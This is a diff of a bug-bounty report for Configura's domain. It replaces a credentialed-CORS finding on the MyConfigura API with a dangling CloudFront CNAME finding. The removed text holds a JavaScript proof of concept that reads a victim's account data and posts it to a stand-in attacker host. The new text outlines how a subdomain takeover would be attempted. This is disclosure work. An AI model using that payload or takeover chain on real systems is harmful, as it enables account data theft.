@@ -1,91 +1,76 @@
-# Overly-permissive credentialed CORS — MyConfigura API reflects any `*.configura.com` origin
+# Dangling CloudFront CNAME — `public-dev.configura.com`
 
 **Program:** Configura Security Bug Bounty Program (Xposera)
 **Scope:** `*.configura.com` (in scope)
-**Affected asset:** `https://www2.configura.com/api/v3` (MyConfigura backend API)
-**Severity:** Medium — **CVSS 3.1 6.5** (`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N`)
-**Weakness:** CWE-942 — Permissive Cross-domain Policy with Untrusted Domains
+**Affected asset:** `public-dev.configura.com`
+**Severity:** Medium (DNS hygiene / subdomain-takeover risk)
+**Weakness:** CWE-1327 — Binding to an Unrestricted/Dangling Resource (dangling DNS record)
 **Date:** 2026-10-07
 
 ---
 
 ## Summary
 
-The MyConfigura backend API at `https://www2.configura.com/api/v3` builds its CORS response by
-**reflecting the request `Origin` header** whenever that origin is any `*.configura.com` host, and
-it returns `Access-Control-Allow-Credentials: true`. Session authentication uses cookies scoped to
-the parent domain `.configura.com`.
+`public-dev.configura.com` is a **dangling CNAME**: it points to an Amazon CloudFront distribution
+(`d2zp2dgwurq7f4.cloudfront.net`) that no longer exists. The DNS record was left in place after the
+underlying CloudFront distribution was deleted.
 
-Because the trust boundary is "any subdomain of configura.com" rather than an explicit list of
-trusted front-ends, **any** web page running on **any** `*.configura.com` origin can send
-credentialed cross-origin requests to the API and **read the responses** — i.e. act as the
-logged-in user and read their account data.
-
-## Steps to reproduce
-
-Send a request to any API endpoint with an arbitrary `*.configura.com` `Origin` header and observe
-that it is reflected together with `Access-Control-Allow-Credentials: true`:
+## Steps to reproduce / Evidence (verified)
 
 ```
-$ curl -s -D- -o /dev/null -H 'Origin: https://public-dev.configura.com' \
-       https://www2.configura.com/api/v3/user/get-logged-in
-HTTP/2 401
-access-control-allow-credentials: true
-access-control-allow-origin: https://public-dev.configura.com      # <-- reflected verbatim
+# 1) The subdomain still has a live CNAME:
+$ dig +noall +answer public-dev.configura.com
+public-dev.configura.com. 3600 IN CNAME d2zp2dgwurq7f4.cloudfront.net.
 
-$ curl -s -D- -o /dev/null -H 'Origin: https://takenover.configura.com' \
-       https://www2.configura.com/api/v3/user/get-logged-in
-access-control-allow-credentials: true
-access-control-allow-origin: https://takenover.configura.com       # <-- any subdomain reflected
+# 2) The CloudFront target no longer resolves (distribution deleted) — on 1.1.1.1, 8.8.8.8, 9.9.9.9:
+$ dig @1.1.1.1 d2zp2dgwurq7f4.cloudfront.net
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, ... ANSWER: 0      # no A record
+
+# 3) Control — a live Configura CloudFront DOES resolve, confirming the method:
+$ dig +short d39qp5n00czdvs.cloudfront.net
+18.161.229.23
+
+# 4) The subdomain currently serves nothing:
+$ curl -m8 -o /dev/null -w '%{http_code}\n' https://public-dev.configura.com/
+000
 ```
 
-An unrelated origin (e.g. `https://evil.attacker.com`) is **not** reflected, confirming the server
-is matching on the `*.configura.com` suffix rather than echoing all origins — but the entire
-`*.configura.com` space is still far too broad for a credentialed, data-bearing API.
+Of 13 CloudFront/SaaS CNAME targets reviewed across the estate, `public-dev.configura.com` is the
+**only** one whose target fails to resolve.
 
-## Proof of concept (impact)
+## Exploitability — honest assessment
 
-An attacker who controls **one** `*.configura.com` origin hosts the following and lures a
-logged-in MyConfigura user to visit it:
+This matches the classic CloudFront subdomain-takeover *pattern* (dangling CNAME to a deleted
+distribution). However, a **working HTTPS takeover is not confirmed and is likely blocked**:
 
-```html
-<script>
-fetch('https://www2.configura.com/api/v3/user/get-logged-in', { credentials: 'include' })
-  .then(r => r.json())
-  .then(d => fetch('https://attacker.example/collect', { method:'POST', body: JSON.stringify(d) }));
-// repeat for briefcases/list, projects, license-administration/*, customer/*, etc.
-</script>
-```
+- To claim the hostname, an attacker must add `public-dev.configura.com` as an **Alternate Domain
+  Name** on a CloudFront distribution they control, **and attach a TLS certificate covering that
+  hostname**.
+- Obtaining a publicly-trusted certificate for `public-dev.configura.com` requires domain-control
+  validation (DNS or HTTP) that the attacker cannot pass without already controlling
+  `configura.com` DNS or the not-yet-claimed host.
+- Without a valid certificate, HTTPS requests to the hostname fail.
 
-The victim's `.configura.com`-scoped session cookies are sent with the cross-origin request; the
-reflected-origin + `Allow-Credentials: true` response lets the attacker's page **read the
-response** and exfiltrate the victim's data (briefcases, projects, licenses, customers) and act as
-them.
-
-### Precondition
-The attacker needs a foothold on some `*.configura.com` origin. That can be obtained via:
-- an XSS / HTML-injection on any Configura subdomain (several subdomains host custom apps), or
-- a subdomain takeover of any `*.configura.com` host.
-
-This precondition is why the rating is **Medium** rather than High. The CORS policy should still be
-fixed, because it converts *any* such sibling-origin foothold into full disclosure of a user's
-MyConfigura account data.
+I did **not** attempt to register a distribution or otherwise claim the subdomain against live
+infrastructure. This report documents the **dangling record** (verified) and the takeover risk —
+not a demonstrated takeover.
 
 ## Impact
 
-- Cross-origin, credentialed read of a logged-in user's MyConfigura data from any attacker-held
-  `*.configura.com` origin.
-- Ability to invoke state-changing API actions as the victim (the CSRF token is likewise readable
-  from a sibling origin's context in a full chain).
+- **Now:** DNS hygiene / standing takeover-risk. A dangling record is a latent liability.
+- **If it ever becomes claimable** (e.g. future AWS behaviour change, or the attacker otherwise
+  obtains a certificate): it would allow serving attacker content from a genuine `*.configura.com`
+  origin — phishing/malware on a trusted Configura domain, cookie setting/fixation on
+  `.configura.com`, and the exact `*.configura.com` origin needed to exploit the separate
+  credentialed-CORS issue on the MyConfigura API.
 
 ## Remediation
 
-- Replace `Origin` reflection with an explicit allow-list of the exact origins that legitimately
-  need credentialed access (for example `https://app.configura.com`, `https://stage.configura.com`).
-- Never combine `Access-Control-Allow-Credentials: true` with a broadly matched / reflected origin.
-- Treat subdomains as untrusted for credentialed CORS; a single compromised or taken-over subdomain
-  should not be able to read authenticated API responses.
+- Remove the `public-dev.configura.com` CNAME, or re-point it to a CloudFront distribution you
+  currently own.
+- Audit all DNS records for CNAMEs targeting deleted CloudFront/S3/other cloud resources.
+- Adopt a process that de-provisions DNS records at the same time as the cloud resource they point
+  to is deleted.
 
 ## Notes
-Verified by header inspection only; no authenticated user data was accessed. In-scope
-`*.configura.com` testing.
+Read-only DNS verification; no takeover performed. In-scope `*.configura.com` testing.
